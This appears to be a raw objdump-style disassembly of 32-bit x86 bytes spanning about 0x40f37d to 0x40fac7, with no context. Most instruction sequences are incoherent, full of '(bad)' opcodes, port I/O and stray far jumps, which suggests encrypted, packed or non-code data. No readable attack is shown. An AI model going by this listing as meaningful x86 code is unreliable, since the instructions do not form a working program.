  40f37d:	push   eax
  40f37e:	jne    0x40f3b6
  40f380:	xchg   esi,eax
  40f381:	mov    eax,0x76890381
  40f386:	data16 mov al,ss:0x7437e820
  40f38d:	fmul   DWORD PTR [ecx]
  40f38f:	(bad)  [ecx-0xc7e74b9]
  40f395:	ret    
  40f396:	inc    esi
  40f397:	push   ecx
  40f398:	lods   al,BYTE PTR ds:[esi]
  40f399:	mov    dl,0xcd
  40f39b:	and    eax,edx
  40f39d:	push   esp
  40f39e:	test   BYTE PTR [eax-0x6a],ah
  40f3a1:	jb     0x40f32a
  40f3a3:	push   0x15ca38ce
  40f3a8:	retf   
  40f3a9:	icebp  
  40f3aa:	push   0xffffffc8
  40f3ac:	push   ecx
  40f3ad:	lahf   
  40f3ae:	mov    WORD PTR [ebx],gs
  40f3b0:	pushf  
  40f3b1:	sub    ebx,DWORD PTR [eax+eiz*1]
  40f3b4:	dec    ecx
  40f3b5:	sysexit 
  40f3b7:	add    DWORD PTR [edx+edx*2],eax
  40f3ba:	mov    bl,0x7a
  40f3bc:	xor    eax,0x6e508247
  40f3c1:	popf   
  40f3c2:	sbb    DWORD PTR [edi-0x8],0xffffff8f
  40f3c6:	xchg   ecx,eax
  40f3c7:	mov    edx,0xa3564c7b
  40f3cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f3cd:	jnp    0x40f399
  40f3cf:	xor    dh,dh
  40f3d1:	in     eax,0x5d
  40f3d3:	pop    ebx
  40f3d4:	out    dx,al
  40f3d5:	jbe    0x40f436
  40f3d7:	out    dx,eax
  40f3d8:	shl    DWORD PTR [eax],cl
  40f3da:	sar    BYTE PTR [eax-0x535ea1b],1
  40f3e0:	jb     0x40f42f
  40f3e2:	adc    eax,0x739ccf06
  40f3e7:	lea    eax,[ecx-0x2b]
  40f3ea:	push   edi
  40f3eb:	jmp    0xe479a251
  40f3f0:	mov    DWORD PTR [ecx+eax*4],eax
  40f3f3:	push   ds
  40f3f4:	scas   al,BYTE PTR es:[edi]
  40f3f5:	xchg   ebp,eax
  40f3f6:	xlat   BYTE PTR ds:[ebx]
  40f3f7:	enter  0x8b40,0xef
  40f3fb:	repnz sbb dl,BYTE PTR [ecx]
  40f3fe:	sbb    eax,0x5ca34580
  40f403:	pop    es
  40f404:	iret   
  40f405:	lahf   
  40f406:	cmp    ch,bl
  40f408:	aaa    
  40f409:	imul   ecx,DWORD PTR [ebp+0x4f1ca60d],0xd9b0e49c
  40f413:	push   edx
  40f414:	cwde   
  40f415:	je     0x40f3cb
  40f417:	push   edx
  40f418:	loopne 0x40f436
  40f41a:	pop    eax
  40f41b:	in     al,dx
  40f41c:	or     BYTE PTR [ebp-0x1b5ff7a8],ah
  40f422:	test   DWORD PTR [edi+0x3605b45f],ebp
  40f428:	fcomp  DWORD PTR ds:0x31a90a58
  40f42e:	sti    
  40f42f:	ins    BYTE PTR es:[edi],dx
  40f430:	push   ds
  40f431:	dec    ecx
  40f432:	push   ebp
  40f433:	mov    ecx,0x7f2f7575
  40f438:	inc    ebp
  40f439:	loop   0x40f435
  40f43b:	adc    DWORD PTR [esp+ebp*8+0x4e],eax
  40f43f:	movq   mm0,mm2
  40f442:	pop    ecx
  40f443:	sbb    eax,0x88f9ad34
  40f448:	ins    BYTE PTR es:[edi],dx
  40f449:	mov    DWORD PTR [edx+0x55],0x51409076
  40f450:	aam    0x9a
  40f452:	pop    ebx
  40f453:	leave  
  40f454:	sbb    BYTE PTR [esi-0x22804c63],dl
  40f45a:	inc    ecx
  40f45b:	jg     0x40f4bd
  40f45d:	dec    eax
  40f45e:	sbb    BYTE PTR [edx+0x24c548d1],0x83
  40f465:	and    eax,0xfbf013df
  40f46a:	mov    bh,0x32
  40f46c:	add    bh,BYTE PTR [edx-0x46f49555]
  40f472:	xlat   BYTE PTR ds:[ebx]
  40f473:	or     al,0x5e
  40f475:	ins    BYTE PTR es:[edi],dx
  40f476:	cmp    bl,al
  40f478:	mov    bl,0x9e
  40f47a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f47b:	dec    edi
  40f47c:	pop    esp
  40f47d:	(bad)  
  40f47e:	cmp    al,0x56
  40f480:	push   ss
  40f481:	sar    DWORD PTR [eax],0x35
  40f484:	dec    edi
  40f485:	inc    ecx
  40f486:	call   0x90fb80df
  40f48b:	jo     0x40f438
  40f48d:	mov    eax,0x55be9ee6
  40f492:	and    eax,0x8b128b0d
  40f497:	xor    eax,0x421c92
  40f49c:	add    DWORD PTR [edx],esi
  40f49e:	mov    esi,DWORD PTR [ebp+0x8]
  40f4a1:	mov    edx,DWORD PTR ds:0x421c92
  40f4a7:	xor    esi,0x7510893
  40f4ad:	add    esi,0x3272db
  40f4b3:	jmp    0x411847
  40f4b8:	jae    0x40f43a
  40f4ba:	mov    ah,0xa9
  40f4bc:	xchg   ebx,eax
  40f4bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4be:	jecxz  0x40f52c
  40f4c0:	pop    esi
  40f4c1:	sbb    ch,BYTE PTR [ebp-0x65]
  40f4c4:	dec    ebp
  40f4c5:	mov    ebp,0x8d4b53f2
  40f4ca:	bound  esp,QWORD PTR [edx-0x15]
  40f4cd:	pop    edi
  40f4ce:	bound  esp,QWORD PTR [edx+0x38]
  40f4d1:	pop    ebx
  40f4d2:	les    esp,FWORD PTR [edx]
  40f4d4:	loope  0x40f542
  40f4d6:	sub    esp,DWORD PTR [edi]
  40f4d8:	push   edx
  40f4d9:	jle    0x40f45d
  40f4db:	cs (bad) 
  40f4dd:	sub    eax,0xcf13b28c
  40f4e2:	leave  
  40f4e3:	in     eax,0xe8
  40f4e5:	xchg   ebx,eax
  40f4e6:	(bad)
  40f4e9:	sub    eax,0xc563bdb0
  40f4ee:	mov    BYTE PTR [ebx],dl
  40f4f0:	gs inc ebp
  40f4f2:	fisub  WORD PTR [ecx-0x6e7255cc]
  40f4f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4f9:	xchg   ebx,eax
  40f4fa:	pop    ebp
  40f4fb:	fistp  WORD PTR [edi+0x643f95e6]
  40f501:	dec    eax
  40f502:	idiv   edi
  40f504:	pop    ebp
  40f505:	ins    BYTE PTR es:[edi],dx
  40f506:	or     eax,0xcf4256f6
  40f50b:	push   0xd9997ec6
  40f510:	adc    al,0xca
  40f512:	or     BYTE PTR [ebp+0x559e34d3],bh
  40f518:	ins    DWORD PTR es:[edi],dx
  40f519:	sub    ebp,ebx
  40f51b:	sub    DWORD PTR [ecx+eax*2],esp
  40f51e:	pop    edi
  40f51f:	mov    ah,0xd6
  40f521:	push   edi
  40f522:	xor    ebp,DWORD PTR [eax+0x6d2dd3bd]
  40f528:	xchg   ebp,eax
  40f529:	clc    
  40f52a:	fld    QWORD PTR [ecx-0x658742bb]
  40f530:	fwait
  40f531:	ss push edi
  40f533:	aad    0xc7
  40f535:	aam    0xf7
  40f537:	pushf  
  40f538:	test   al,0xbe
  40f53a:	test   eax,0xfb642995
  40f53f:	inc    ebp
  40f540:	xchg   edx,ecx
  40f542:	push   edx
  40f543:	inc    edi
  40f544:	test   DWORD PTR [esi-0x38f4514d],ebp
  40f54a:	test   al,0x38
  40f54c:	jno    0x40f566
  40f54e:	jne    0x40f5a5
  40f550:	(bad)  
  40f551:	push   edx
  40f552:	dec    eax
  40f553:	add    al,0x15
  40f555:	aam    0xf4
  40f557:	mov    bl,0x94
  40f559:	pushf  
  40f55a:	test   DWORD PTR [eax-0x7e7dce95],edx
  40f560:	into   
  40f561:	sahf   
  40f562:	xchg   ecx,eax
  40f563:	cmp    ebp,esp
  40f565:	pop    eax
  40f566:	push   ebx
  40f567:	popf   
  40f568:	sub    al,0x7e
  40f56a:	stos   BYTE PTR es:[edi],al
  40f56b:	mov    al,0x31
  40f56d:	push   esp
  40f56e:	dec    ebp
  40f56f:	into   
  40f570:	mov    ds:0xe0626394,al
  40f575:	add    al,0x67
  40f577:	scas   eax,DWORD PTR es:[edi]
  40f578:	xchg   BYTE PTR [esi],bl
  40f57a:	or     esi,DWORD PTR [edi+eiz*1-0x7f]
  40f57e:	cmp    ah,BYTE PTR [eax+0xdc7c167]
  40f584:	sahf   
  40f585:	lods   eax,DWORD PTR ds:[esi]
  40f586:	lea    ebx,[edi+0x1444a65c]
  40f58c:	jnp    0x40f592
  40f58e:	lahf   
  40f58f:	sbb    dh,dl
  40f591:	push   esi
  40f592:	sahf   
  40f593:	inc    ebx
  40f594:	lods   eax,DWORD PTR ds:[esi]
  40f595:	leave  
  40f596:	aam    0xba
  40f598:	push   esi
  40f599:	jne    0x40f5a0
  40f59b:	es js  0x40f582
  40f59e:	xor    BYTE PTR [edi-0x39],bh
  40f5a1:	mov    eax,ds:0x1baf41d8
  40f5a6:	fnstenv [bp+si]
  40f5a9:	jb     0x40f61c
  40f5ab:	push   ss
  40f5ac:	inc    esp
  40f5ad:	dec    esp
  40f5ae:	iret   
  40f5af:	repz (bad) 
  40f5b1:	shl    ebp,1
  40f5b3:	lahf   
  40f5b4:	jns    0x40f597
  40f5b6:	and    DWORD PTR [ecx+0x7361ea63],0x9d95e4cd
  40f5c0:	pop    ebp
  40f5c1:	adc    al,0x6e
  40f5c3:	or     al,0x3f
  40f5c5:	dec    ebp
  40f5c6:	fs push ebx
  40f5c8:	xor    BYTE PTR [edx-0x54],bl
  40f5cb:	adc    BYTE PTR [ebx],0xeb
  40f5ce:	stc    
  40f5cf:	xor    ecx,ebp
  40f5d1:	jl     0x40f5d5
  40f5d3:	lahf   
  40f5d4:	push   ss
  40f5d5:	dec    ecx
  40f5d6:	ds push es
  40f5d8:	ss in  al,0x31
  40f5db:	mov    esi,ecx
  40f5dd:	xchg   edi,eax
  40f5de:	or     edi,edx
  40f5e0:	in     eax,dx
  40f5e1:	push   0x6d
  40f5e3:	frstor [ebx-0x598578af]
  40f5e9:	sar    DWORD PTR [ecx-0x77631caf],0xfc
  40f5f0:	scas   al,BYTE PTR es:[edi]
  40f5f1:	pop    edi
  40f5f2:	(bad)  
  40f5f3:	adc    ebp,DWORD PTR [edi+esi*1-0x3df41c58]
  40f5fa:	in     al,dx
  40f5fb:	out    dx,eax
  40f5fc:	out    dx,al
  40f5fd:	in     al,dx
  40f5fe:	jbe    0x40f64e
  40f600:	aam    0x6d
  40f602:	stos   DWORD PTR es:[edi],eax
  40f603:	push   edi
  40f604:	shr    ch,0xcd
  40f607:	jnp    0x40f590
  40f609:	cmp    eax,0xfa60c866
  40f60e:	inc    ebx
  40f60f:	fcom   st(4)
  40f611:	iret   
  40f612:	sti    
  40f613:	dec    edi
  40f614:	mov    al,0xef
  40f616:	retf   
  40f617:	into   
  40f618:	sbb    DWORD PTR [ebx+0x11],ebp
  40f61b:	xchg   DWORD PTR [edx+ebp*8],edx
  40f61e:	xchg   edi,eax
  40f61f:	mov    ah,0xfb
  40f621:	jmp    0x11ca:0x4965e320
  40f628:	ja     0x40f671
  40f62a:	mov    bl,0x9f
  40f62c:	or     eax,0xec723721
  40f631:	mov    BYTE PTR [esi],0x5e
  40f634:	dec    edx
  40f635:	lea    ecx,[esi-0x348f115e]
  40f63b:	cmp    edi,DWORD PTR [esi+0x2c]
  40f63e:	add    al,0xc9
  40f640:	(bad)  
  40f641:	mov    ebx,0xefa7140c
  40f646:	(bad)
  40f649:	push   edx
  40f64a:	adc    al,0xda
  40f64c:	jmp    0x40f643
  40f64e:	pop    edx
  40f64f:	adc    BYTE PTR [edx+0x65],dl
  40f652:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f653:	pop    ecx
  40f654:	nop
  40f655:	imul   ebp,DWORD PTR [edi+0x74],0x7c
  40f659:	ret    
  40f65a:	push   cs
  40f65b:	call   0x4ce7:0x42afc088
  40f662:	inc    esp
  40f663:	(bad)  
  40f664:	sub    BYTE PTR [eax-0x7e],dh
  40f667:	aam    0xf3
  40f669:	rol    esi,1
  40f66b:	fptan  
  40f66d:	fs xchg edx,eax
  40f66f:	cmp    eax,0x7d849780
  40f674:	cld    
  40f675:	fwait
  40f676:	shl    BYTE PTR [ebp-0x139a87ac],0x25
  40f67d:	push   ebp
  40f67e:	scas   eax,DWORD PTR es:[edi]
  40f67f:	mov    dl,BYTE PTR [esi+0x53]
  40f682:	push   ss
  40f683:	xchg   ecx,eax
  40f684:	add    eax,esi
  40f686:	js     0x40f6f3
  40f688:	mov    WORD PTR [ebx-0x542bad92],es
  40f68e:	stos   BYTE PTR es:[edi],al
  40f68f:	aas    
  40f690:	dec    eax
  40f691:	xor    BYTE PTR [edi+0x24],dl
  40f694:	call   0xfc31:0xfc9a1c3c
  40f69b:	imul   DWORD PTR [ebx]
  40f69d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f69e:	imul   DWORD PTR [ecx+0x38]
  40f6a1:	fldcw  WORD PTR [ecx-0x4]
  40f6a4:	aaa    
  40f6a5:	inc    edx
  40f6a6:	and    eax,0x17399a33
  40f6ab:	push   ss
  40f6ac:	retf   0x933a
  40f6af:	ret    0xbb
  40f6b2:	pop    ebp
  40f6b3:	retf   
  40f6b4:	pop    ebp
  40f6b5:	jb     0x40f643
  40f6b7:	retf   0xd87d
  40f6ba:	add    BYTE PTR [eax*8-0x3f844dd6],bh
  40f6c1:	js     0x40f64f
  40f6c3:	test   eax,0xdfff7486
  40f6c8:	adc    BYTE PTR [ebx],0x9f
  40f6cb:	(bad)  
  40f6cc:	pop    ds
  40f6cd:	jo     0x40f71b
  40f6cf:	out    dx,al
  40f6d0:	leave  
  40f6d1:	je     0x40f725
  40f6d3:	mov    bl,0x78
  40f6d5:	xor    eax,DWORD PTR [eax]
  40f6d7:	(bad)  [esp+edi*1+0x12]
  40f6db:	and    eax,0x6201c3da
  40f6e0:	shr    DWORD PTR [ebx-0x6551b11a],cl
  40f6e6:	(bad)  
  40f6e8:	push   ecx
  40f6e9:	lods   al,BYTE PTR ds:[esi]
  40f6ea:	add    DWORD PTR [ebx],ebx
  40f6ec:	sti    
  40f6ed:	push   ebp
  40f6ee:	aas    
  40f6ef:	adc    DWORD PTR [eax+0x7d],esp
  40f6f2:	or     al,0xbd
  40f6f4:	lods   eax,DWORD PTR ds:[esi]
  40f6f5:	or     esp,esp
  40f6f7:	imul   ebx,DWORD PTR [edx-0x57b4d12a],0xffffffba
  40f6fe:	sbb    al,0xe7
  40f700:	sub    ah,ah
  40f702:	test   DWORD PTR [ebx],eax
  40f704:	mov    ds:0x4eceb9d3,al
  40f709:	mov    ebx,0x7684ff51
  40f70e:	or     DWORD PTR [ebx],ecx
  40f710:	and    al,0xf5
  40f712:	xchg   BYTE PTR [edi],al
  40f714:	rcr    DWORD PTR [edi-0x69],cl
  40f717:	outs   dx,DWORD PTR ds:[esi]
  40f718:	les    edx,FWORD PTR [ecx-0x5b3f10fb]
  40f71e:	inc    ebx
  40f71f:	or     dl,BYTE PTR [ecx-0x2a]
  40f722:	mov    esi,0xb277445e
  40f727:	retf   0x2604
  40f72a:	outs   dx,BYTE PTR ds:[esi]
  40f72b:	fcom   DWORD PTR [esi+0xaeac849]
  40f731:	xchg   DWORD PTR [ecx+0x42],esi
  40f734:	adc    al,0x58
  40f736:	jbe    0x40f7a7
  40f738:	mov    eax,0x5fd81d43
  40f73d:	sub    al,0x73
  40f73f:	popf   
  40f740:	out    0xf5,eax
  40f742:	cwde   
  40f743:	outs   dx,BYTE PTR ds:[esi]
  40f744:	xchg   ebx,eax
  40f745:	mov    dl,ah
  40f747:	mov    ecx,0xbd28745d
  40f74c:	sbb    ebx,esp
  40f74e:	ficom  WORD PTR [ebx-0x41]
  40f751:	(bad)
  40f754:	cwde   
  40f755:	outs   dx,BYTE PTR ds:[esi]
  40f756:	jb     0x40f747
  40f758:	stos   DWORD PTR es:[edi],eax
  40f759:	pop    es
  40f75a:	jno    0x40f7d5
  40f75c:	fs mov bl,0x70
  40f75f:	test   DWORD PTR [esi+0x26],ecx
  40f762:	daa    
  40f763:	(bad)  
  40f764:	clc    
  40f765:	(bad)  
  40f766:	push   cs
  40f767:	test   ebx,ecx
  40f769:	adc    dl,BYTE PTR [eax+0x7d]
  40f76c:	inc    ebx
  40f76d:	push   cs
  40f76e:	pop    es
  40f76f:	jbe    0x40f716
  40f771:	inc    ebx
  40f772:	aaa    
  40f773:	cmp    eax,0x983f78a5
  40f778:	in     al,dx
  40f779:	pushf  
  40f77a:	addr16 in eax,dx
  40f77c:	out    0xe0,al
  40f77e:	cmp    eax,ecx
  40f780:	mov    fs,WORD PTR [ebx+edx*8]
  40f783:	test   al,0xb6
  40f785:	xor    BYTE PTR es:0x9e95c7f4,ch
  40f78c:	xchg   DWORD PTR [edx+0x3bce76c],ebx
  40f792:	popa   
  40f793:	pushf  
  40f794:	inc    esp
  40f795:	inc    ecx
  40f796:	ds mov edi,0x1f032626
  40f79c:	mov    eax,0xba242c59
  40f7a1:	test   BYTE PTR [ecx+0x6dae3160],bl
  40f7a7:	jmp    FWORD PTR [eax-0x4877c06d]
  40f7ad:	jmp    0x40f7b4
  40f7af:	gs and ch,bh
  40f7b2:	lds    eax,FWORD PTR [ebx-0x55]
  40f7b5:	sbb    edx,eax
  40f7b7:	lods   eax,DWORD PTR ds:[esi]
  40f7b8:	cdq    
  40f7b9:	in     al,dx
  40f7ba:	retf   0xf72b
  40f7bd:	mov    dh,0x3b
  40f7bf:	cmp    al,0x8d
  40f7c1:	loope  0x40f7af
  40f7c3:	mov    ds:0x5966e97,eax
  40f7c8:	mov    dl,0x2b
  40f7ca:	dec    ecx
  40f7cb:	outs   dx,BYTE PTR ds:[esi]
  40f7cc:	outs   dx,BYTE PTR ds:[esi]
  40f7cd:	sbb    BYTE PTR [edi+0x30],ch
  40f7d0:	adc    al,0x68
  40f7d2:	test   DWORD PTR [eax-0x62874623],ebp
  40f7d8:	dec    ebp
  40f7d9:	nop
  40f7da:	inc    esp
  40f7db:	dec    ebp
  40f7dc:	dec    esp
  40f7dd:	dec    esp
  40f7de:	lods   eax,DWORD PTR ds:[esi]
  40f7df:	xor    BYTE PTR [ecx+esi*4-0x422ff055],dl
  40f7e6:	inc    edi
  40f7e7:	test   DWORD PTR [ebp+0x357ed47d],0xafd6ea3
  40f7f1:	dec    esi
  40f7f2:	leave  
  40f7f3:	int    0x72
  40f7f5:	pusha  
  40f7f6:	dec    ebx
  40f7f7:	call   DWORD PTR [esi+0x33]
  40f7fa:	scas   al,BYTE PTR es:[edi]
  40f7fb:	mov    si,0x9425
  40f7ff:	cdq    
  40f800:	and    al,0xca
  40f802:	mov    edi,0x2685e84d
  40f807:	ret    
  40f808:	in     al,dx
  40f809:	jbe    0x40f83e
  40f80b:	inc    edi
  40f80c:	add    eax,0x5f474c15
  40f811:	lahf   
  40f812:	cmp    al,0xc
  40f814:	jb     0x40f892
  40f816:	imul   eax,DWORD PTR [ebx-0x1e93d12c],0x859650ba
  40f820:	inc    esi
  40f821:	retf   0xdfdc
  40f824:	cmp    DWORD PTR [ebp+edx*2+0x418f8bc1],esp
  40f82b:	mov    ds:0xae08e7d,al
  40f830:	jne    0x40f7bd
  40f832:	into   
  40f833:	mov    eax,ds:0x7ee37fe2
  40f838:	xchg   BYTE PTR [edi+0x39],dl
  40f83b:	mov    ecx,0xb156e550
  40f840:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f841:	xor    BYTE PTR [eax+0x1fa27e5d],dh
  40f847:	nop
  40f848:	std    
  40f849:	psrlq  mm2,mm5
  40f84c:	dec    esp
  40f84d:	or     ch,bl
  40f84f:	mov    dl,BYTE PTR [esi-0x7cf09d6b]
  40f855:	and    esi,DWORD PTR [eax+0x2e]
  40f858:	shl    BYTE PTR [esi-0x7],1
  40f85b:	cmp    DWORD PTR [edi],esp
  40f85d:	mov    bh,0x8b
  40f85f:	inc    esp
  40f860:	inc    edi
  40f861:	iret   
  40f862:	bound  eax,QWORD PTR [ebx]
  40f864:	fistp  QWORD PTR [ebp+0x63]
  40f867:	call   0xbe5b63d2
  40f86c:	clc    
  40f86d:	pop    ss
  40f86e:	inc    edi
  40f86f:	fisttp DWORD PTR [edx-0x8]
  40f872:	adc    BYTE PTR [edi-0x3f],0x9d
  40f876:	inc    ebx
  40f877:	push   edx
  40f878:	ja     0x40f8c2
  40f87a:	out    dx,eax
  40f87b:	fisttp WORD PTR [ebp-0x2b453dde]
  40f881:	into   
  40f882:	sbb    BYTE PTR [ecx],bl
  40f884:	fisubr DWORD PTR [edi]
  40f886:	fsubr  QWORD PTR [ebx]
  40f888:	push   ebp
  40f889:	ss adc ecx,eax
  40f88c:	jge    0x40f84e
  40f88e:	or     edx,esi
  40f890:	pop    ebx
  40f891:	popf   
  40f892:	or     dl,BYTE PTR [ebp+0x25]
  40f895:	retf   
  40f896:	cmp    al,0x73
  40f898:	shl    BYTE PTR [ecx+0x37],1
  40f89b:	(bad)  
  40f89c:	pop    edi
  40f89d:	pop    esp
  40f89e:	adc    eax,DWORD PTR [ebx]
  40f8a0:	test   BYTE PTR [eax+0x622f832d],ah
  40f8a6:	sar    BYTE PTR [esi+0x47],1
  40f8a9:	sbb    BYTE PTR [ebp+0x583c2cb2],0x36
  40f8b0:	xlat   BYTE PTR ds:[ebx]
  40f8b1:	ror    BYTE PTR [ecx+ecx*8-0x9826cf8],cl
  40f8b8:	in     eax,dx
  40f8b9:	adc    esi,DWORD PTR [edx+0x32a8bc9e]
  40f8bf:	aas    
  40f8c0:	ret    0xb9f2
  40f8c3:	bound  ebp,QWORD PTR [esi+ebx*8]
  40f8c6:	pop    edi
  40f8c7:	arpl   WORD PTR [ecx+eax*1],di
  40f8ca:	lods   al,BYTE PTR ds:[esi]
  40f8cb:	cmc    
  40f8cc:	jl     0x40f87e
  40f8ce:	mov    DWORD PTR [ebx+esi*8],edx
  40f8d1:	test   al,0x6c
  40f8d3:	cdq    
  40f8d4:	popf   
  40f8d5:	xor    eax,0x8e7b896
  40f8da:	or     al,0x6c
  40f8dc:	ja     0x40f8c1
  40f8de:	mov    ebx,0xec7bd96e
  40f8e3:	test   eax,0x89c25dca
  40f8e8:	ins    BYTE PTR es:[edi],dx
  40f8e9:	and    eax,0x1c4381d0
  40f8ee:	jg     0x40f93d
  40f8f0:	xor    edi,ecx
  40f8f2:	ror    DWORD PTR [eax+0x5040eaa0],cl
  40f8f8:	add    al,0x64
  40f8fa:	xchg   esi,eax
  40f8fb:	dec    ecx
  40f8fc:	out    dx,eax
  40f8fd:	shr    DWORD PTR [esi+0x26441983],1
  40f903:	test   BYTE PTR [edx],ah
  40f905:	push   ebx
  40f906:	and    al,0x88
  40f908:	and    DWORD PTR [esp+esi*1],ebp
  40f90b:	pushf  
  40f90c:	in     eax,dx
  40f90d:	adc    BYTE PTR [edx+0x73145b50],bh
  40f913:	mov    ah,0xa4
  40f915:	mov    dh,0x6a
  40f917:	mov    esi,0x81ef8df5
  40f91c:	jne    0x40f924
  40f91e:	sahf   
  40f91f:	fsubr  st(1),st
  40f921:	inc    esp
  40f922:	loope  0x40f92f
  40f924:	arpl   WORD PTR [bp+si-0x3a],sp
  40f928:	and    al,0x6f
  40f92a:	inc    ecx
  40f92b:	mov    BYTE PTR [edx-0x1f],bl
  40f92e:	int    0xcb
  40f930:	xchg   ebx,eax
  40f931:	mov    eax,0x4725a516
  40f936:	ins    BYTE PTR es:[edi],dx
  40f937:	sub    edx,ebp
  40f939:	ja     0x40f901
  40f93b:	retf   
  40f93c:	loope  0x40f953
  40f93e:	cmc    
  40f93f:	fnstsw ax
  40f941:	jae    0x40f95e
  40f943:	stos   DWORD PTR es:[edi],eax
  40f944:	dec    edx
  40f945:	rcr    BYTE PTR [edx+0x29],cl
  40f948:	bound  esp,QWORD PTR [eax+edx*1]
  40f94b:	add    BYTE PTR [edx-0x5d],0xe5
  40f94f:	adc    ah,dl
  40f951:	xchg   esi,eax
  40f952:	(bad)  
  40f953:	(bad)  
  40f954:	lods   eax,DWORD PTR ds:[esi]
  40f955:	ja     0x40f8da
  40f957:	lods   eax,DWORD PTR ds:[esi]
  40f958:	(bad)  
  40f959:	push   0x1d37f49a
  40f95e:	fstp   QWORD PTR [esi+0x440589bc]
  40f964:	jae    0x40f97a
  40f966:	aas    
  40f967:	test   eax,0x7f9ae75e
  40f96c:	test   BYTE PTR [esi],dh
  40f96e:	lds    ecx,FWORD PTR ds:0x5393a253
  40f974:	cs inc ebx
  40f976:	mov    eax,ds:0x195aee0b
  40f97b:	fsub   DWORD PTR [edi]
  40f97d:	stos   DWORD PTR es:[edi],eax
  40f97e:	dec    edx
  40f97f:	jne    0x40f988
  40f981:	push   edi
  40f982:	inc    ecx
  40f983:	fwait
  40f984:	sbb    al,0x95
  40f986:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f987:	mov    al,ds:0xe3175bf7
  40f98c:	mov    esp,0x8e6926bf
  40f991:	jae    0x40f956
  40f993:	mov    al,al
  40f995:	mov    ?,esi
  40f997:	lds    esi,FWORD PTR [esi-0x7a328ccc]
  40f99d:	popf   
  40f99e:	xor    al,0x26
  40f9a0:	mov    ebx,edx
  40f9a2:	pop    esi
  40f9a3:	jge    0x40f984
  40f9a5:	ins    DWORD PTR es:[edi],dx
  40f9a6:	cmp    cl,bl
  40f9a8:	dec    eax
  40f9a9:	(bad)  
  40f9ab:	stos   DWORD PTR es:[edi],eax
  40f9ac:	mov    bl,0x3
  40f9ae:	ins    DWORD PTR es:[edi],dx
  40f9af:	mov    eax,0xc9daeee
  40f9b4:	dec    DWORD PTR [edx]
  40f9b6:	ss sub eax,0x7746b2ba
  40f9bc:	push   0xf
  40f9be:	sbb    ecx,DWORD PTR [ecx+0x8]
  40f9c1:	adc    esp,DWORD PTR [edi]
  40f9c3:	bound  esp,QWORD PTR [ebx-0x22]
  40f9c6:	mov    ebx,0x6e2c7c11
  40f9cb:	sub    bl,ah
  40f9cd:	mov    ecx,0xfb32ef3f
  40f9d2:	loopne 0x40f958
  40f9d4:	ror    DWORD PTR [edx+0x286abfa4],0x1f
  40f9db:	ja     0x40fa20
  40f9dd:	retf   
  40f9de:	fcomi  st,st(6)
  40f9e0:	out    0xa6,al
  40f9e2:	lods   al,BYTE PTR ds:[esi]
  40f9e3:	mov    ds:0xa7fe40ef,eax
  40f9e8:	jmp    0x6595db48
  40f9ed:	adc    eax,0x791c0dbe
  40f9f2:	xchg   DWORD PTR [ebx+0x9],edx
  40f9f5:	jnp    0x40fa5f
  40f9f7:	mov    al,0x65
  40f9f9:	mov    ds:0x7f345755,al
  40f9fe:	cmp    dl,BYTE PTR [ebp-0x5092ad55]
  40fa04:	in     al,dx
  40fa05:	push   edx
  40fa06:	sbb    al,0x74
  40fa08:	fimul  WORD PTR [edi]
  40fa0a:	fisubr WORD PTR [edi]
  40fa0c:	lock stos BYTE PTR es:[edi],al
  40fa0e:	or     eax,0x9ab385b
  40fa13:	lods   eax,DWORD PTR ds:[esi]
  40fa14:	repnz aad 0x47
  40fa17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa18:	pop    edx
  40fa19:	pop    ebp
  40fa1a:	mov    eax,0x4cda3688
  40fa1f:	stc    
  40fa20:	jecxz  0x40fa9a
  40fa22:	nop
  40fa23:	pop    ebp
  40fa24:	je     0x40f9de
  40fa26:	mov    ds:0x9e8899cd,eax
  40fa2b:	test   BYTE PTR [edi+0x2c],bh
  40fa2e:	xor    bh,bl
  40fa30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa31:	dec    esp
  40fa32:	push   ecx
  40fa33:	cld    
  40fa34:	push   ds
  40fa35:	out    0xde,eax
  40fa37:	lds    ebp,FWORD PTR [edx+0x78]
  40fa3a:	cmp    ecx,DWORD PTR [eax]
  40fa3c:	dec    edi
  40fa3d:	mov    edx,0xac9b9fbe
  40fa42:	and    eax,0xebe43ebd
  40fa47:	(bad)  
  40fa48:	dec    ebx
  40fa49:	gs scas al,BYTE PTR es:[edi]
  40fa4b:	outs   dx,BYTE PTR ds:[esi]
  40fa4c:	sbb    al,0x6d
  40fa4e:	popa   
  40fa4f:	sub    al,0xc1
  40fa51:	mov    al,0x94
  40fa53:	outs   dx,BYTE PTR ds:[esi]
  40fa54:	jno    0x40fa7a
  40fa56:	out    0x4f,eax
  40fa58:	pop    ss
  40fa59:	inc    ebp
  40fa5a:	sub    eax,0x3561b88d
  40fa5f:	aas    
  40fa60:	loopne 0x40f9e9
  40fa62:	ins    BYTE PTR es:[edi],dx
  40fa63:	xchg   esp,eax
  40fa64:	out    dx,eax
  40fa65:	jo     0x40fa41
  40fa67:	push   ebp
  40fa68:	and    edx,0x82c169fa
  40fa6e:	pop    edx
  40fa6f:	pop    ds
  40fa70:	test   DWORD PTR [ecx-0x1e11e9be],0xd9cbc896
  40fa7a:	sub    eax,0x59e0c8d7
  40fa7f:	xor    eax,0x2617b02c
  40fa84:	rol    edx,0x45
  40fa87:	loop   0x40fa58
  40fa89:	or     DWORD PTR [edx+0x3050fc6d],edi
  40fa8f:	jb     0x823d4fca
  40fa95:	sbb    BYTE PTR [ebx-0x37fe3b90],0x67
  40fa9c:	push   ds
  40fa9d:	out    0xae,al
  40fa9f:	pop    es
  40faa0:	sub    dh,0x68
  40faa3:	scas   eax,DWORD PTR es:[edi]
  40faa4:	cmp    BYTE PTR [esi],ch
  40faa6:	(bad)  
  40faa7:	cld    
  40faa8:	xor    bh,dl
  40faaa:	add    DWORD PTR [eax-0x1c],0x4decc8cb
  40fab1:	inc    eax
  40fab2:	add    DWORD PTR [ecx+0x6e7467f5],0x179e7844
  40fabc:	int    0x30
  40fabe:	loop   0x40fad5
  40fac0:	mov    ebp,0xb50124aa
  40fac5:	mov    ah,0xc
  40fac7:	in     eax,0xd
